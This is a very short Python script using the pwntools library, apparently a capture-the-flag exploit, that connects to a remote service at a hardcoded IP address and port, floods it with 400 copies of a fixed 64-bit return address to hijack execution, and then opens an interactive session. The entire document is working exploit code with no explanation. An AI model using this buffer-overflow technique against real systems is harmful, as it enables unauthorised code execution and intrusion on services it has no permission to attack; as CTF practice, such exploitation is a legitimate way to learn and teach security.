from pwn import *

p=remote("220.249.52.134",48483)

p.sendline(p64(0x40060d)*400)
p.interactive()
